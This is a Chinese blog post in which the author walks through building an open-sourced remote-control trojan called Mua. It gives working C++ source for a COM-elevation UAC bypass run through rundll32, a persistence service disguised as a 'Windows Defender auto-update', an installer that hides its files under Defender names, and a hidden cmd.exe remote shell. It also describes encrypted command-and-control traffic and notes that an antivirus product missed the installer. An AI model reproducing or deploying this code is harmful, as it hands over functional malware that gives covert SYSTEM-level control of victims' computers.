木马连起来读就是Mua
<!--more-->

去年年末和社团好友聊天的时候，突然萌生了写一个属于自己的木马的想法。然后有幸遇到了一位超级厉害的大师傅，他给我介绍了很多有关木马的知识，受益匪浅。他建议我先写远程SHELL和文件上传这两个最基础的功能，然后后续的功能可以作为组件推送给被控端。他还建议我上驱动，因为r3现在能做的事情不是很多。等等。

寒假过了几天才有时间开始翻资料动手写，满打满算写了20天左右。本来还想继续完善的，但是要开学了，索性直接把目前的版本开源吧，写这篇文章主要是记录一下我目前的进展。因为时间问题，写的还简陋，目前只实现了远程SHELL和文件上传下载，而且未经大量测试，程序的健壮性还不行，劳请师傅们多多包涵。

论坛里的大佬太多了，本文仅供抛砖引玉。我也是第一次写木马，没啥经验，而且水平有限，如有谬误，请您批评指正O(∩_∩)O

代码开源在：[iyzyi/Mua-Remote-Control-Trojan: MUA远控木马 (github.com)](https://github.com/iyzyi/Mua-Remote-Control-Trojan)

虽然代码很简陋，也就供师傅们看一乐，但是还是得加一句：请勿用于非法用途。

## 通信模型

首先，一个木马最基础的自然就是通信了。通信模型的好坏直接决定了被检测出恶意流量的几率。

### gh0st的通信

举个例子，gh0st的封包的开头5个字节都是Gh0st，这就可以作为流量检测的匹配规则。

相关源码：

```c++
// Packet Flag;
BYTE bPacketFlag[] = {'G', 'h', '0', 's', 't'};
memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));

// 中间省略无关代码

LONG nBufLen = destLen + HDR_SIZE;
// 5 bytes packet flag
pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
// 4 byte header [整个数据包的大小]
pContext->m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
// 4 byte header [解压缩整个包的大小]
pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
// Write Data
pContext->m_WriteBuffer.Write(pDest, destLen);
delete [] pDest;
```

当然，用这个作为流量检测也不是很方便，首先EDR也得跟着处理粘包才能将封包从TCP数据流中分离出来（吧），其次手里有源码，可以随便改这个封包头。

由于我没做过EDR的工作，这里就不深入展开了。免得贻笑大方。但是我个人还是觉得，这种明显的标志最好不要出现在传输的流量中，增加了暴露的可能。

gh0st的作者为啥要安排这5个字节？翻阅源码可以知道答案：（我添加了一些方便理解的注释）

```c++
// 缓冲区数据长度是否大于封包头部长度（这是处理粘包的标准操作）
while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
{
    BYTE bPacketFlag[FLAG_SIZE];
    CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
	
    // 封包是否合法 通过 封包头部五个字节是否是Gh0st 来判断的
    if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
        throw "bad buffer";

    int nSize = 0;
    CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

    // Update Process Variable
    pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

    if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
    {
        int nUnCompressLength = 0;
        // Read off header
        pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));

        pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
        pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));

        ////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////
        // SO you would process your data here
        // 
        // I'm just going to post message so we can see the data
        int	nCompressLength = nSize - HDR_SIZE;
        PBYTE pData = new BYTE[nCompressLength];
        PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

        if (pData == NULL || pDeCompressionData == NULL)
            throw "bad Allocate";

        pContext->m_CompressionBuffer.Read(pData, nCompressLength);

        //////////////////////////////////////////////////////////////////////////
        unsigned long	destLen = nUnCompressLength;
        int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
        //////////////////////////////////////////////////////////////////////////
        if (nRet == Z_OK)
        {
            pContext->m_DeCompressionBuffer.ClearBuffer();
            pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
            m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE_COMPLETE);
        }
        else
        {
            throw "bad buffer";
        }

        delete [] pData;
        delete [] pDeCompressionData;
        pContext->m_nMsgIn++;
    }
    else
        break;
}
```

所以，这5个字节仅仅是用来判断是否是正确的封包的。除此之外没有别的用处。而且作用不大，很难分辨出封包是否是攻击者伪装的，因为攻击者只要使他伪造的封包也以Gh0st开头，就能通过这个检测。唯一的作用可能是处理粘包失败的时候可以及时抛出异常。

依我之见，判断封包是否合法，完全可以靠序列号/检验和来实现。

### 流量加密

gh0st应该是没有加密的，我没找到相关的代码，应该只是用zlib压缩了下数据。

ForsShare的加密算法就是简单的异或了一下：

```c++
void MyMainFunc::EncryptByte(LPVOID pData, DWORD nLen)
{
	BYTE* pTmpData = (BYTE*) pData;
	for(DWORD i = 0; i < nLen; i++)
	{
		pTmpData[i] = pTmpData[i] ^ PS_ENTRY_COMM_KEY;	
	}
}
```

大灰狼是在gh0st基础上发展的，它使用的是RC4。不过我之前好像在哪里听说过RC4不安全了，好像是在TLS那里。

我选用的加密算法是AES-128-CFB，然后密钥和IV是通过RSA来传递的。

### 封包结构

首先介绍下封包结构：

我设想的封包结构是这样的：

封包长度（4字节）+ 校验和（4字节）+ 命令号（2字节）+ 其他包头（5字节）+ 包体

加密的话，只加密`命令号（2字节）+ 其他包头（5字节）+ 包体`。封包长度和校验和是不能加密的。封包长度用于处理粘包；校验和也不加密是因为：如果校验和加密了，则必须先解密整个封包才能解密出校验和，才能校验封包的有效性。这样的话，攻击者发来一个极大的封包，我们先解密，再校验封包的有效性，不管封包是否有效，我们都花了很大的代价解密这个封包，如果攻击者大量发送构造的假封包，我们很容易被拒绝服务。

目前实现的封包结构是这样的：

封包长度（4字节）+ 命令号（2字节）+ 暂未启用（4字节）+ 暂未启用（1字节）

目前包头有效的字段其实只有命令号。

### 通信流程

然后介绍下通信流程：

主控端和被控端均使用AES-128-CFB进行加密通信。

首先，被控端随机产生AES-128-CFB的密钥和IV，使用主控端的RSA公钥加密后，发送给主控端。

主控端收到后，使用自己的RSA私钥解密出AES-128-CFB的密钥和IV，然后生成命令号为CRYPEO_KEY的封包，使用密钥加密后，发给被控端。

被控端收到上述封包后，向主控端发送上线包，上线包包含了一些基本的环境信息。

主控端收到上线包后，向被控端发送上线包的响应包，双方正式建立通信。

## 提升权限

程序运行的时候，基本上只是普通的用户权限，除非通过社工的手段，比如伪造成游戏的作弊器之类的，欺骗使用者右键使用管理员权限打开（或者弹出下图的这种框的时候点击是）。

![image-20210302215533760](http://image.iyzyi.com/img/20210303112446.png)

但是一些敏感操作，有需要管理员权限，比如向系统盘的某些文件夹写文件，比如设置系统服务等等。所以需要进行提权。

github上有个项目叫[hfiref0x/UACME: Defeating Windows User Account Control (github.com)](https://github.com/hfiref0x/UACME)，讲得就是Windows的提权，方法挺多了，但是好多都不能用了，或者是条件有些苛刻，或者是太难了我没看懂。

这里介绍个很容易懂，代码也很简洁的方法：

> COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以提升COM接口权限。同时，ICMLuaUtil接口提供了ShellExec方法来执行命令，创建指定进程。因此，我们可以利用COM提升名称来对ICMLuaUtil接口提权，之后通过接口调用ShellExec方法来创建指定进程，实现BypassUAC。

但是，执行这段代码的必须是可信程序（指直接获取管理员权限，而不触发UAC弹框的白名单程序），才能实现提权（不弹出上图中的那个对话框）。可信程序有rundll32.exe，lsass.exe，svchost.exe等等，这些也是恶意软件经常滥用的程序。当然计算器，记事本这些也是白名单程序，不过没啥可利用的地方。

刚好rundll32就可以执行32位dll文件里的函数，所以可以用它来执行提权的代码。

rundll32执行的函数，如果没有参数，则可以直接定义无参函数；如果有参数，则必须按照如下的格式来定义：

```
void CALLBACK FuncName(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow);
```

第三个参数lpszCmdLine就是传给函数的命令行参数。

BypassUAC.h

```c++
#pragma once


#include <Windows.h>
#include <objbase.h>
#include <strsafe.h>


#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"


typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE *QueryInterface)(
			__RPC__in ICMLuaUtil * This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void **ppvObject);

	ULONG(STDMETHODCALLTYPE *AddRef)(
		__RPC__in ICMLuaUtil * This);

	ULONG(STDMETHODCALLTYPE *Release)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method1)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method2)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method3)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method4)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method5)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method6)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *ShellExec)(
		__RPC__in ICMLuaUtil * This,
		_In_     LPCWSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow
		);

	HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(
		__RPC__in ICMLuaUtil * This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString
		);

	HRESULT(STDMETHODCALLTYPE *Method9)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method10)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method11)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method12)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method13)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method14)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method15)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method16)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method17)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method18)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method19)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method20)(
		__RPC__in ICMLuaUtil * This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid);

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable);

// 套壳CMLuaUtilBypassUAC
extern "C" _declspec(dllexport) void CALLBACK WindowsUpdate(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
```

BypassUAC.cpp

```c++
#include "pch.h"
#include "BypassUAC.h"
#include "Shlobj.h"
#include <atlconv.h>


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// 初始化COM环境
	::CoInitialize(NULL);

	// 构造字符串
	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// 设置BIND_OPTS3
	::RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// 创建名称对象并获取COM对象
	hr = ::CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}


BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil *CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	do {
		::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		// 提权
		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		// 启动程序
		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}

		bRet = TRUE;
	} while (FALSE);

	// 释放
	if (CMLuaUtil)
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}


void CALLBACK WindowsUpdate(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	USES_CONVERSION;
	CMLuaUtilBypassUAC(A2W(lpszCmdLine));
}
```

把WindowsUpdate定义为导出函数，生成dll，然后在安装程序中调用`rundll32.exe BypassUAC.dll _WindowUpdate@16 xxx.exe`，就可以以管理员的权限运行xxx.exe这个程序了。

可能有个小众的知识点需要提一下：

CALLBACK是\_\_stdcall的别称，而c方式和\_\_stdcall组合时，编译后名字为FunName@x，如果是导出函数，则在Dll中也叫_FunName@x（x是所有参数占空间的总大小）。

![image-20210302222107182](http://image.iyzyi.com/img/20210303112447.png)

## 开机自启

实现开机自启的方法有很多，我这边用的是系统服务实现的。

### 快速启动目录

windows系统有一个用于快速启动的目录，该文件夹下的程序（或者是快捷方式）会在开机的时候自动启动。可以使用SHGetSpecialFolderPath()获取这个目录。

### 注册表

向`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`写入程序路径即可。

### 系统服务

系统服务需要管理员权限才能设置，前面说过怎么提权了。

设置好了以后，程序会以系统服务的形式开机自启，而且会是SYSTEM权限。

这个地方分两部分，一个用于设置和启动系统服务，一个是系统服务程序本身。

```c++
BOOL RegisterSystemService(WCHAR lpszDriverPath[]) {

	WCHAR pszServiceName[MAX_PATH] = L"Windows Defender自动更新";
	WCHAR pszServiceDesc[MAX_PATH] = L"使你的Windows Defender保持最新状态。如果此服务已禁用或停止，则Windows Defender将无法保持最新状态，这意味这无法修复可能产生的安全漏洞，并且功能也可能无法使用。";

	// 为路径加上引号，因为CreateService中的lpBinaryPathName要求带引号，除非路径中没空格
	WCHAR lpBinaryPathName[MAX_PATH + 2];
	wsprintf(lpBinaryPathName, L"\"%s\"", lpszDriverPath);

	SC_HANDLE shOSCM = NULL, shCS = NULL;
	SERVICE_STATUS ss;
	DWORD dwErrorCode = 0;
	BOOL bSuccess = FALSE;
	// 打开服务控制管理器数据库
	shOSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!shOSCM) {
		return FALSE;
	}

	// 创建服务，设置开机自启
	shCS = CreateService(shOSCM, pszServiceName, pszServiceName,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,	SERVICE_ERROR_NORMAL, lpBinaryPathName, NULL, NULL, NULL, NULL, NULL);
	if (!shCS){
		return FALSE;
	}

	// 设置服务的描述
	SERVICE_DESCRIPTION ServiceDesc;
	ServiceDesc.lpDescription = pszServiceDesc;
	ChangeServiceConfig2(shCS, SERVICE_CONFIG_DESCRIPTION, &ServiceDesc);

	if (!StartService(shCS, 0, NULL))	{
		return FALSE;
	}

	if (shCS) {
		CloseServiceHandle(shCS);
		shCS = NULL;
	}
	if (shOSCM)	{
		CloseServiceHandle(shOSCM);
		shOSCM = NULL;
	}
	return TRUE;
}
```

服务的名称设置为`Windows Defender自动更新`，服务的描述也有一定的迷惑性。

注释写得差不多了，只有一点需要注意，CreateService()中的lpBinaryPathName这个路径，记得两边用引号包裹起来。

然后是系统服务程序，要符合其规范，需要实现ServiceMain服务入口函数：

```c++
// 服务的入口函数
void ServiceMain(int argc, wchar_t* argv[])
{
	g_ServiceStatusHandle = RegisterServiceCtrlHandler(g_szServiceName, ServiceHandle);

	TellSCM(SERVICE_START_PENDING, 0, 1);
	TellSCM(SERVICE_RUNNING, 0, 0);

	// 执行我们的代码
	MyCode();

	while (TRUE) {
		Sleep(5000);
	}
}


// 服务的处理回调的函数
void WINAPI ServiceHandle(DWORD dwOperateCode) {

	switch (dwOperateCode)
	{
	case SERVICE_CONTROL_PAUSE:
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;

	case SERVICE_CONTROL_CONTINUE:
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;

	case SERVICE_CONTROL_STOP:
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;

	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}
}


BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress) {

	SERVICE_STATUS serviceStatus = { 0 };
	BOOL bRet = FALSE;

	RtlZeroMemory(&serviceStatus, sizeof(serviceStatus));
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = dwState;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = dwExitCode;
	serviceStatus.dwWaitHint = 3000;

	bRet = SetServiceStatus(g_ServiceStatusHandle, &serviceStatus);
	return bRet;
}


void MyCode() {
	HINSTANCE  hDll = LoadLibrary(L"WindowsDefenderAutoUpdate.dll");
	FUNC pfnRunMuaClient = (FUNC)GetProcAddress(hDll, "WindowsDefenderAutoUpdate");
	pfnRunMuaClient();
}
```

其实就是个通用的框架，只需要实现MyCode这个函数就行了。

最后的MyCode()是Load了MuaClient.dll，调用WindowsDefenderAutoUpdate函数，实际上就是启动被控端。

## 关于安装

Debug编译的话，只生成MuaClient.exe，用于测试。命令行下`MuaClient.exe Host Port`即可运行。

Release编译的话，生成MuaClient.dll，InstallMuaClient.exe，SystemService.exe.

InstallMuaClient.exe用于安装MuaClient被控端。安装时三个文件需在同一文件夹内。

`InstallMuaClient.exe`首先将`MuaClient.dll`和`SystemService.exe`复制到`C:\Users\当前用户名\AppData\Roaming\Windows Defender`，分别重命名为`WindowsDefenderAutoUpdate.dll`和`WindowsDefenderAutoUpdate.exe`。然后通过rundll32调用`MuaClient.dll`重命名后的`WindowsDefenderAutoUpdate.dll`里面的WindowsUpdate函数，用于提权后以管理员权限再次执行`InstallMuaClient.exe`。此时将`SystemService.exe`重命名后的`WindowsDefenderAutoUpdate.exe`添加为系统服务，同时设置为开机自启，并启动此服务。

这样就完成了安装，此后就会以系统服务的形式开机自启。权限是SYSTEM。

没怎么做免杀，但是目前的效果似乎还可以。

InstallMuaClient.exe:

![image-20210302232913627](http://image.iyzyi.com/img/20210303112448.png)

MuaClient.dll:

![image-20210302232822006](http://image.iyzyi.com/img/20210303112449.png)

SystemService.exe:

![image-20210302232612557](http://image.iyzyi.com/img/20210303112450.png)

测试的时候一直开着火绒，安装的时候，全程没有拦截。只有通过命令行添加新用户的时候拦截了一下。不过好像正常的用户通过命令行添加新用户也会拦截。

## 关于测试

我是在win10上开发的，环境是vs2017。

请务必在虚拟机内测试。

MuaClient是32位的，使用InstallMuaClient.exe安装后即可。

MuaServer源码中没有限定64位或32位，不过开发和测试都是以32位为主，64位具体能不能用我没测试。运行时需要将相应的HPSocket_??.dll放在程序所在目录，该dll可在`.\MuaServer\HPSocket`中找到。

## 远程SHELL

![Inkedimage-20210302201027386_LI](http://image.iyzyi.com/img/20210303112451.jpg)

远程SHELL的实现，可以分两部分，一是如何在本地与CMD.exe进行数据的交互，二是数据在网络中的传输。

### 网络通信

简单说下通信。

主控端发起请求，向被控端发送SHELL_CONNECT包

被控端接收请求后，初始化相应的环境，打开cmd.exe进程，然后响应SHELL_CONNECT包

主控端发送SHELL_EXECUTE包，包体是要执行的命令。

被控端接收后，将要执行的命令通过匿名管道写入cmd.exe。

然后被控端循环读取命令的执行结果，并向主控端发送SHELL_EXECUTE_RESULT封包，包体是执行结果。

### 本地交互

首先介绍一下管道：

管道是一种用于在进程间共享数据的机制，其实质是一段共享内存。Windows系统为这段共享的内存设计采用数据流I/0的方式来访问。由一个进程读、另一个进程写，类似于一个管道两端，因此这种进程间的通信方式称作“管道”。

管道分为匿名管道和命名管道。

匿名管道只能在父子进程间进行通信，不能在网络间通信，而且数据传输是单向的，只能一端写，另一端读。

命令管道可以在任意进程间通信，通信是双向的，任意一端都可读可写，但是在同一时间只能有一端读、一端写。

在这里，我们可以创建两条匿名管道，一条用来向cmd.exe进程中写数据，一条用来从cmd.exe进程中读数据。

同时，需要注意到，cmd.exe有的时候执行的命令进程不会中止，比如`ping -t iyzyi.com`，这个会一直循环下去。但是我们最后关闭cmd.exe的时候，并不会关闭这个ping.exe进程。因为windows中关闭父进程，并不会关闭相应的子进程。所以这里我们需要设置一个作业，并将cmd进程和这个作业相关联。这样的话，cmd.exe进程关闭的时候，其所有的子进程都会关闭。

>  Windows提供了一个作业（job）内核对象，它允许我们将进程组合在一起并创建一个“沙箱”来限制进程能够做什么。最好将作业对象想象成一个进程容器。但是创建只包含一个进程的作业同样非常有用，因为这样可以对进程施加平时不能施加的限制。

```c++
DWORD WINAPI CModuleShellRemote::RunCmdProcessThreadFunc(LPVOID lParam)
{
	CModuleShellRemote* pThis = (CModuleShellRemote*)lParam;

	STARTUPINFO					si;
	PROCESS_INFORMATION			pi;
	SECURITY_ATTRIBUTES			sa;

	HANDLE						hRead = NULL;
	HANDLE						hWrite = NULL;
	HANDLE						hRead2 = NULL;
	HANDLE						hWrite2 = NULL;

	WCHAR						pszSystemPath[MAX_PATH] = { 0 };
	WCHAR						pszCommandPath[MAX_PATH] = { 0 };

	
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道
	if (!CreatePipe(&hRead, &hWrite2, &sa, 0)) {
		goto Clean;
	}
	if (!CreatePipe(&hRead2, &hWrite, &sa, 0)) {
		goto Clean;
	}

	pThis->m_hRead = hRead;
	pThis->m_hWrite = hWrite;

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdInput = hRead2;
	si.hStdError = hWrite2;
	si.hStdOutput = hWrite2;	
	si.wShowWindow  =SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	// 获取系统目录
	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath)); 
	// 拼接成启动cmd.exe的命令
	StringCbPrintf(pszCommandPath, MAX_PATH, L"%s\\cmd.exe", pszSystemPath);

	// 创建作业
	// 一开始没用作业，结果只能中止cmd进程，但是它的子进程，比如ping -t xxx.com，没法中止。杀掉父进程，子进程仍会运行，所以改用作业
	pThis->m_hJob = CreateJobObject(NULL, NULL);

	// 创建CMD进程
	if (!CreateProcess(pszCommandPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		DebugPrint("error = 0x%x\n", GetLastError());
		goto Clean;
	}

	// 将cmd进程添加到作业中
	AssignProcessToJobObject(pThis->m_hJob, pi.hProcess);

	// 创建好进程后就向主控端发送CONNECT响应包。
	pThis->m_pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
	SetEvent(pThis->m_hSendPacketShellRemoteConnectEvent);

	// 等待关闭
	WaitForSingleObject(pThis->m_pChildSocketClient->m_hChildSocketClientExitEvent, INFINITE);

Clean:
	//释放句柄
	if (hRead != NULL) {
		CloseHandle(hRead);
		hRead = NULL;
		pThis->m_hRead = NULL;
	}
	if (hRead2 != NULL) {
		CloseHandle(hRead2);
		hRead2 = NULL;
	}
	if (hWrite != NULL) {
		CloseHandle(hWrite);
		hWrite = NULL;
		pThis->m_hWrite = NULL;
	}
	if (hWrite2 != NULL) {
		CloseHandle(hWrite2);
		hWrite2 = NULL;
	}
	return 0;
}

// 本函数只将要执行的命令写入CMD进程的缓冲区，执行结果由另一线程负责循环读取并发送
VOID WINAPI CModuleShellRemote::OnRecvPacketShellRemoteExecute(LPVOID lParam) {
	SHELL_REMOTE_EXECUTE_THREAD_PARAM* pThreadParam = (SHELL_REMOTE_EXECUTE_THREAD_PARAM*)lParam;
	CModuleShellRemote* pThis = pThreadParam->m_pThis;
	CPacket* pPacket = pThreadParam->m_pPacket;
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;
	delete pThreadParam;

	CHAR pszCommand[SHELL_MAX_LENGTH];
	DWORD dwBytesWritten = 0;

	EnterCriticalSection(&pThis->m_ExecuteCs);

	WideCharToMultiByte(CP_ACP, 0, (PWSTR)pPacket->m_pbPacketBody, -1, pszCommand, SHELL_MAX_LENGTH, NULL, NULL);
	strcat_s(pszCommand, "\r\n");
	if (pThis->m_hWrite != NULL) {
		WriteFile(pThis->m_hWrite, pszCommand, strlen(pszCommand), &dwBytesWritten, NULL);
	}

	LeaveCriticalSection(&pThis->m_ExecuteCs);

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}
}

// 循环从缓冲区读取命令的执行结果，并发送给主控端
VOID CModuleShellRemote::LoopReadAndSendCommandReuslt() {
	BYTE SendBuf[SEND_BUFFER_MAX_LENGTH];
	DWORD dwBytesRead = 0;
	DWORD dwTotalBytesAvail = 0;

	while (m_hRead != NULL)
	{
		// 触发关闭事件时跳出循环，结束线程。
		if (WAIT_OBJECT_0 == WaitForSingleObject(m_pChildSocketClient->m_hChildSocketClientExitEvent, 0)) {
			break;
		}

		while (true) {
			// 和ReadFile类似，但是这个不会删掉已读取的缓冲区数据，而且管道中没有数据时可以立即返回。
			// 而在管道中没有数据时，ReadFile会阻塞掉，所以我用PeekNamedPipe来判断管道中有数据，以免阻塞。
			PeekNamedPipe(m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, &dwTotalBytesAvail, NULL);
			if (dwBytesRead == 0) {
				break;
			}
			dwBytesRead = 0;
			dwTotalBytesAvail = 0;

			// 我的需求是取一次运行结果就清空一次已读取的缓冲区，所以PeekNamedPipe仅用来判断管道是否为空，取数据还是用ReadFile
			BOOL bReadSuccess = ReadFile(m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, NULL);

			if (WAIT_OBJECT_0 != WaitForSingleObject(m_pChildSocketClient->m_hChildSocketClientExitEvent, 0)) {
				m_pChildSocketClient->SendPacket(SHELL_EXECUTE_RESULT, (PBYTE)SendBuf, dwBytesRead);
			}

			memset(SendBuf, 0, sizeof(SendBuf));
			dwBytesRead = 0;
			Sleep(100);
		}
	}
}
```

## 文件上传下载

接下来描述的上传指主控端向被控端上传，下载指主控端从被控端下载。

其实这个组件涉及的知识不是很多，比较重要点的是做好线程间的同步。

一开始不知道这个文件上传怎么实现好，因为如果复用之前的封包架构的话，对于大文件是比较吃力的，因为没有校验机制，而且要自己处理分片，很容易出错。

然后去读了几个木马的源码。实现的方法各不相同。

有一个是用FTP实现的上传下载。原理是主控端开一个FTP服务器，然后被控端使用API实现上传和下载。但是，FTP的账号和密码是写在被控端源码里的。我一头墨水，妥实没想明白，作者是如何保证FTP的账号和密码是如何避免泄露的，这不一逆向就能拿到了吗？

如果账号和密码是动态传输的，需要的时候主控端再临时传给被控端，这样可以避免逆向泄露账号和密码，但是攻击者只需要伪造文件上传的请求，就可以从主控端那里欺骗得到账号和密码了。

还有一个方案是HTTP实现的，这个我感觉比较适合被控端从主控端下载文件，并不适合主控端从被控端下载文件。因为这种方案，同时要在主控端开一个HTTP(S)服务器，用于接收和发送文件，发送文件还好，一直开放着接口进行通信没太大的安全问题，但是接收文件，必须要慎重，如何区分允许哪个被控端是我允许进行向我发送文件的，这个判断是个值得好好规划的问题，HTTP服务器接受匿名的请求，我感觉很难区分不同的被控端。比如说我要从被控端A下载一个文件，此时A向我发送文件，我接收了，同时被控端B是攻击者伪造的，他一直尝试向我发送文件，当我允许A向我传输文件的瞬间，B也向我传输了文件（因为HTTP服务器无法区分不同用户），任意文件上传还是比较可怕的。这一点深深困扰着我。不知道有没有师傅知道怎么避免这一点，还请赐教。

然后又读了下gh0st的源码，它的实现和我最初抛弃的方案是一样的，即直接自己将文件分片，然后压缩，然后直接在网络中传输。（事实上，它的处理更为巧妙。gh0st的作者直接封装了一个底层的Buffer类，这个类封装了一系列的读写操作，文件的读取分片是自动由这个类完成的，分片的大小就是这是Buffer类的缓冲区大小）

